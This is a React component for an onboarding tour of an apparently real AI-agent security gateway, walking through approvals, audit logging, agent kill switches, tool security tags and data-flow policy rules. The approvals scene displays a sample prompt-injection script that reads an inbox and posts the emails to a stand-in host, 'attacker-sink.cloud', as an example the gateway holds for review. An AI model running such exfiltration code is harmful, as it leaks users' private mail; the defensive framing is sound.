'use client';

import React, { useState, useEffect } from 'react';
import { useRouter, usePathname } from 'next/navigation';

export interface VisualTourStep {
  id: string;
  section: string;
  title: string;
  badge: string;
  href: string;
  summary: string;
  actionText: string;
  type: 'overview' | 'approvals' | 'audit' | 'agents' | 'tools' | 'policies' | 'benchmark';
}

const TOUR_STEPS: VisualTourStep[] = [
  {
    id: 'overview',
    section: 'Overview',
    title: 'Command Center & Real-Time Telemetry',
    badge: 'Live Status',
    href: '/app',
    summary: 'Monitor agent activity, pending security holds, and token savings in real time.',
    actionText: 'What to do: Check here for system health and fleet-wide script runs.',
    type: 'overview',
  },
  {
    id: 'approvals',
    section: 'Approvals Queue',
    title: 'Inspect & Decide Held Scripts',
    badge: 'Zero-Trust Gate',
    href: '/app/approvals',
    summary: 'High-risk operations (such as untrusted email reading + external webhooks) are automatically quarantined.',
    actionText: 'What to do: Review the flagged code and click Approve or Deny.',
    type: 'approvals',
  },
  {
    id: 'audit',
    section: 'Audit Trail',
    title: 'Cryptographic Event Stream',
    badge: 'Immutable Log',
    href: '/app/audit',
    summary: 'Every script submission, policy check, and tool invocation is recorded with SHA-256 hashes in Redis.',
    actionText: 'What to do: Filter by agent or event type for compliance and forensic reviews.',
    type: 'audit',
  },
  {
    id: 'agents',
    section: 'Agents & Fleet',
    title: 'Agent Controls & Kill Switches',
    badge: 'Instant Halt',
    href: '/app/agents',
    summary: 'Track agent API token usage and trigger instant emergency suspension on any misbehaving agent.',
    actionText: 'What to do: Click Emergency Suspend to halt an agent immediately.',
    type: 'agents',
  },
  {
    id: 'tools',
    section: 'MCP Tools',
    title: 'Catalog & Semantic Security Tags',
    badge: 'Catalog & Tags',
    href: '/app/tools',
    summary: 'Tools are mapped with security tags (reads_untrusted, writes_external) so unsafe flows are caught.',
    actionText: 'What to do: Browse approved MCP tools available to your agents.',
    type: 'tools',
  },
  {
    id: 'policies',
    section: 'Policies',
    title: 'Deterministic Guardrails (R1–R6)',
    badge: 'Deterministic Rules',
    href: '/app/policies',
    summary: 'Mathematical AST rules check data flow in under 1ms, preventing prompt injection bypasses.',
    actionText: 'What to do: View active rules governing script execution permissions.',
    type: 'policies',
  },
  {
    id: 'benchmark',
    section: 'Benchmark',
    title: '99.5% Token Reduction Proof',
    badge: 'Empirical Proof',
    href: '/app/results',
    summary: 'Single-shot scripts replace multi-turn schema chat loops, slashing costs from 607k to 2.7k tokens.',
    actionText: 'What to do: Review verified benchmarks across 62 attack and benign scenarios.',
    type: 'benchmark',
  },
];

interface ProductTourModalProps {
  forceOpen?: boolean;
  onClose?: () => void;
}

export function ProductTourModal({ forceOpen = false, onClose }: ProductTourModalProps) {
  const router = useRouter();
  const pathname = usePathname();
  const [isOpen, setIsOpen] = useState(false);
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);
  const [simulatedKillSwitch, setSimulatedKillSwitch] = useState(false);
  const [simulatedDecision, setSimulatedDecision] = useState<'pending' | 'approved' | 'denied'>('pending');

  useEffect(() => {
    const hasSeenTour = localStorage.getItem('airlock_product_tour_v2');
    if (forceOpen || !hasSeenTour) {
      setIsOpen(true);
    }
  }, [forceOpen]);

  // Video-like auto-play progress
  useEffect(() => {
    if (!isPlaying || !isOpen) return;

    const timer = setInterval(() => {
      setCurrentStepIndex((prev) => {
        if (prev < TOUR_STEPS.length - 1) {
          return prev + 1;
        } else {
          setIsPlaying(false);
          return prev;
        }
      });
    }, 5500);

    return () => clearInterval(timer);
  }, [isPlaying, isOpen]);

  const step = TOUR_STEPS[currentStepIndex];

  function handleClose() {
    localStorage.setItem('airlock_product_tour_v2', 'seen');
    setIsOpen(false);
    setIsPlaying(false);
    if (onClose) onClose();
  }

  function handleNext() {
    if (currentStepIndex < TOUR_STEPS.length - 1) {
      setCurrentStepIndex(currentStepIndex + 1);
    } else {
      handleClose();
    }
  }

  function handlePrev() {
    if (currentStepIndex > 0) {
      setCurrentStepIndex(currentStepIndex - 1);
    }
  }

  function handleNavigate() {
    router.push(step.href);
    handleClose();
  }

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/70 backdrop-blur-xs animate-in fade-in duration-150">
      <div className="relative w-full max-w-2xl bg-white border border-slate-200 rounded-2xl shadow-2xl overflow-hidden flex flex-col">
        {/* Top Video-Player Header */}
        <div className="px-5 py-3.5 bg-slate-900 text-white flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-rose-500/80"></span>
              <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80"></span>
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80"></span>
            </div>
            <div className="h-4 w-px bg-slate-700"></div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-mono font-bold text-emerald-400">
                SCENE {currentStepIndex + 1}/{TOUR_STEPS.length}
              </span>
              <span className="text-xs text-slate-300 font-medium">{step.section}</span>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => setIsPlaying(!isPlaying)}
              className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center gap-1.5 transition-colors"
            >
              <span>{isPlaying ? 'Pause' : 'Auto Play'}</span>
              <span className="text-[10px] text-emerald-400">{isPlaying ? '❚❚' : '▶'}</span>
            </button>
            <button
              onClick={handleClose}
              className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white text-xs font-semibold transition-colors"
            >
              Close
            </button>
          </div>
        </div>

        {/* Visual Scene Simulation Window */}
        <div className="p-5 bg-slate-950 text-slate-200 flex flex-col justify-center min-h-[240px] border-b border-slate-800 relative overflow-hidden">
          {/* Animated Video-like Scene Renderer */}
          {step.type === 'overview' && (
            <div className="flex flex-col gap-3 animate-in fade-in duration-200">
              <div className="flex items-center justify-between text-xs font-mono text-slate-400 pb-2 border-b border-slate-800">
                <span className="flex items-center gap-1.5 text-emerald-400 font-semibold">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                  GATEWAY ACTIVE — 0.8ms P95 LATENCY
                </span>
                <span>telemetry: live</span>
              </div>
              <div className="grid grid-cols-4 gap-2 text-center">
                <div className="p-2.5 bg-slate-900 border border-slate-800 rounded-lg">
                  <div className="text-[10px] text-slate-400 font-mono uppercase">Pending</div>
                  <div className="text-lg font-bold font-mono text-amber-400">2</div>
                </div>
                <div className="p-2.5 bg-slate-900 border border-slate-800 rounded-lg">
                  <div className="text-[10px] text-slate-400 font-mono uppercase">Script Runs</div>
                  <div className="text-lg font-bold font-mono text-white">34</div>
                </div>
                <div className="p-2.5 bg-slate-900 border border-slate-800 rounded-lg">
                  <div className="text-[10px] text-slate-400 font-mono uppercase">Tokens Saved</div>
                  <div className="text-lg font-bold font-mono text-emerald-400">1,31,023</div>
                </div>
                <div className="p-2.5 bg-slate-900 border border-slate-800 rounded-lg">
                  <div className="text-[10px] text-slate-400 font-mono uppercase">AST Check</div>
                  <div className="text-lg font-bold font-mono text-cyan-400">1.2 ms</div>
                </div>
              </div>
              <div className="p-2 bg-slate-900/60 border border-slate-800/80 rounded font-mono text-[11px] text-slate-400 flex items-center justify-between">
                <span>[stream:audit] policy.intercept: agent-nemotron-super</span>
                <span className="text-emerald-400">held in queue</span>
              </div>
            </div>
          )}

          {step.type === 'approvals' && (
            <div className="flex flex-col gap-3 animate-in fade-in duration-200">
              <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg flex flex-col gap-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono text-slate-300">appr-demo-prompt-injection</span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-950 text-amber-300 border border-amber-800">
                    PENDING REVIEW
                  </span>
                </div>
                <div className="text-xs text-slate-200 font-mono bg-slate-950 p-2 rounded border border-slate-800/80">
                  <span className="text-rose-400">const</span> emails = <span className="text-blue-400">await</span> tools.inbox.get_emails();<br />
                  <span className="text-blue-400">await</span> tools.http.post({'{'} url: &quot;attacker-sink.cloud&quot;, data: emails {'}'});
                </div>
                <div className="flex items-center justify-between pt-1">
                  <span className="text-[11px] font-mono text-rose-400">reads untrusted → writes external</span>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => setSimulatedDecision('approved')}
                      className={`px-3 py-1 rounded text-xs font-bold transition-all ${
                        simulatedDecision === 'approved' ? 'bg-emerald-500 text-slate-950' : 'bg-emerald-600/30 text-emerald-300 hover:bg-emerald-600/50'
                      }`}
                    >
                      {simulatedDecision === 'approved' ? 'Approved' : 'Approve'}
                    </button>
                    <button
                      onClick={() => setSimulatedDecision('denied')}
                      className={`px-3 py-1 rounded text-xs font-bold transition-all ${
                        simulatedDecision === 'denied' ? 'bg-rose-500 text-white' : 'bg-rose-600/30 text-rose-300 hover:bg-rose-600/50'
                      }`}
                    >
                      {simulatedDecision === 'denied' ? 'Denied' : 'Deny'}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {step.type === 'audit' && (
            <div className="flex flex-col gap-2 font-mono text-xs animate-in fade-in duration-200">
              <div className="p-2 bg-slate-900 border border-slate-800 rounded flex items-center justify-between text-slate-300">
                <span className="text-slate-400">15:04:12</span>
                <span className="text-emerald-400 font-semibold">script.allowed</span>
                <span className="text-slate-400 truncate max-w-[140px]">sha256: 8f7a93b4...</span>
                <span className="text-[10px] px-1.5 py-0.5 bg-slate-800 rounded text-slate-300">0.7ms</span>
              </div>
              <div className="p-2 bg-slate-900 border border-slate-800 rounded flex items-center justify-between text-slate-300">
                <span className="text-slate-400">15:03:45</span>
                <span className="text-amber-400 font-semibold">policy.intercept</span>
                <span className="text-slate-400 truncate max-w-[140px]">sha256: 2c1e44a1...</span>
                <span className="text-[10px] px-1.5 py-0.5 bg-amber-950 text-amber-300 rounded">held</span>
              </div>
              <div className="p-2 bg-slate-900 border border-slate-800 rounded flex items-center justify-between text-slate-300">
                <span className="text-slate-400">15:02:10</span>
                <span className="text-cyan-400 font-semibold">operator.decision</span>
                <span className="text-slate-400">decidedBy: gautham</span>
                <span className="text-[10px] px-1.5 py-0.5 bg-cyan-950 text-cyan-300 rounded">approved</span>
              </div>
            </div>
          )}

          {step.type === 'agents' && (
            <div className="flex flex-col gap-3 animate-in fade-in duration-200">
              <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg flex items-center justify-between">
                <div>
                  <div className="text-xs font-bold text-white font-mono">agent-nemotron-super</div>
                  <div className="text-[11px] text-slate-400">Triage & CRM Worker · 34 calls today</div>
                </div>
                <div className="flex items-center gap-2">
                  <span
                    className={`text-[10px] font-mono px-2 py-0.5 rounded font-bold ${
                      simulatedKillSwitch ? 'bg-rose-950 text-rose-300 border border-rose-800' : 'bg-emerald-950 text-emerald-300 border border-emerald-800'
                    }`}
                  >
                    {simulatedKillSwitch ? 'HALTED' : 'ACTIVE'}
                  </span>
                  <button
                    onClick={() => setSimulatedKillSwitch(!simulatedKillSwitch)}
                    className={`px-3 py-1 rounded text-xs font-semibold transition-all ${
                      simulatedKillSwitch ? 'bg-slate-700 text-white' : 'bg-rose-600 hover:bg-rose-500 text-white'
                    }`}
                  >
                    {simulatedKillSwitch ? 'Resume Agent' : 'Emergency Suspend'}
                  </button>
                </div>
              </div>
              <div className="text-[11px] font-mono text-slate-400 text-center">
                {simulatedKillSwitch ? 'Agent kill switch engaged. Execution blocked at gateway.' : 'Interactive preview: Click button above to test emergency kill switch.'}
              </div>
            </div>
          )}

          {step.type === 'tools' && (
            <div className="grid grid-cols-3 gap-2 text-xs font-mono animate-in fade-in duration-200">
              <div className="p-2.5 bg-slate-900 border border-slate-800 rounded flex flex-col gap-1">
                <span className="text-white font-bold">inbox.get_emails</span>
                <span className="text-[10px] text-amber-400">reads_untrusted</span>
                <span className="text-[10px] text-slate-500 mt-auto">Scope: customer</span>
              </div>
              <div className="p-2.5 bg-slate-900 border border-slate-800 rounded flex flex-col gap-1">
                <span className="text-white font-bold">http.post</span>
                <span className="text-[10px] text-rose-400">writes_external</span>
                <span className="text-[10px] text-slate-500 mt-auto">Scope: webhook</span>
              </div>
              <div className="p-2.5 bg-slate-900 border border-slate-800 rounded flex flex-col gap-1">
                <span className="text-white font-bold">tickets.update</span>
                <span className="text-[10px] text-emerald-400">internal_mutation</span>
                <span className="text-[10px] text-slate-500 mt-auto">Scope: support</span>
              </div>
            </div>
          )}

          {step.type === 'policies' && (
            <div className="flex flex-col gap-2 animate-in fade-in duration-200">
              <div className="flex items-center gap-2 text-xs font-mono justify-center text-slate-300">
                <span className="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-slate-200">Agent Script</span>
                <span>→</span>
                <span className="px-2 py-1 bg-blue-950 border border-blue-800 rounded text-blue-300">AST Acorn (&lt;1ms)</span>
                <span>→</span>
                <span className="px-2 py-1 bg-rose-950 border border-rose-800 rounded text-rose-300">Policy R1–R6</span>
                <span>→</span>
                <span className="px-2 py-1 bg-emerald-950 border border-emerald-800 rounded text-emerald-300">Allow / Hold</span>
              </div>
              <div className="p-2.5 bg-slate-900/80 border border-slate-800 rounded text-xs text-slate-300 mt-2">
                <span className="font-bold text-amber-400 font-mono">Rule R2 Trigger:</span> Reading untrusted input + external HTTP egress is automatically held for human operator review.
              </div>
            </div>
          )}

          {step.type === 'benchmark' && (
            <div className="flex flex-col gap-2.5 animate-in fade-in duration-200">
              <div className="flex items-center justify-between text-xs font-mono text-slate-300">
                <span>Classic Multi-Turn (607k tokens)</span>
                <span className="text-rose-400 font-bold">$1.82 per task</span>
              </div>
              <div className="w-full h-3 bg-slate-900 rounded-full overflow-hidden border border-slate-800">
                <div className="h-full bg-rose-500/80 w-full"></div>
              </div>

              <div className="flex items-center justify-between text-xs font-mono text-slate-300 mt-1">
                <span>Airlock Single-Shot Script (2.7k tokens)</span>
                <span className="text-emerald-400 font-bold">$0.008 per task</span>
              </div>
              <div className="w-full h-3 bg-slate-900 rounded-full overflow-hidden border border-slate-800">
                <div className="h-full bg-emerald-500 w-[5%]"></div>
              </div>
              <div className="text-center text-xs font-mono text-emerald-400 font-bold pt-1">
                99.5% Token Reduction · 31/31 Attacks Detected
              </div>
            </div>
          )}
        </div>

        {/* Crisp Text & Action Guidance */}
        <div className="p-5 flex flex-col gap-3 bg-white text-slate-800">
          <div>
            <h3 className="text-base font-bold text-slate-900">{step.title}</h3>
            <p className="text-xs text-slate-600 mt-1 leading-relaxed">{step.summary}</p>
          </div>

          <div className="p-3 bg-slate-50 border border-slate-200 rounded-lg flex items-center justify-between gap-3 text-xs">
            <span className="font-semibold text-slate-700">{step.actionText}</span>
            <button
              onClick={handleNavigate}
              className={`px-3 py-1.5 rounded-md text-xs font-semibold shrink-0 transition-all ${
                pathname === step.href
                  ? 'bg-slate-200 text-slate-700'
                  : 'bg-slate-900 hover:bg-slate-800 text-white shadow-xs'
              }`}
            >
              {pathname === step.href ? 'Already Here' : 'Go to Page →'}
            </button>
          </div>
        </div>

        {/* Scrubber & Navigation Footer */}
        <div className="px-5 py-3.5 bg-slate-50 border-t border-slate-200 flex items-center justify-between">
          {/* Visual Scene Indicators */}
          <div className="flex items-center gap-1.5">
            {TOUR_STEPS.map((s, idx) => (
              <button
                key={s.id}
                onClick={() => setCurrentStepIndex(idx)}
                className={`h-2 rounded-full transition-all ${
                  idx === currentStepIndex
                    ? 'w-7 bg-slate-900'
                    : 'w-2 bg-slate-300 hover:bg-slate-400'
                }`}
                title={s.section}
              />
            ))}
          </div>

          {/* Stepper Buttons */}
          <div className="flex items-center gap-2">
            {currentStepIndex > 0 && (
              <button
                onClick={handlePrev}
                className="px-3 py-1.5 bg-white border border-slate-200 hover:bg-slate-100 text-slate-700 rounded-md text-xs font-semibold transition-colors"
              >
                ← Prev
              </button>
            )}
            <button
              onClick={handleNext}
              className="px-4 py-1.5 bg-slate-900 hover:bg-slate-800 text-white rounded-md text-xs font-semibold transition-colors shadow-xs"
            >
              {currentStepIndex === TOUR_STEPS.length - 1 ? 'Finish Tour' : 'Next Scene →'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
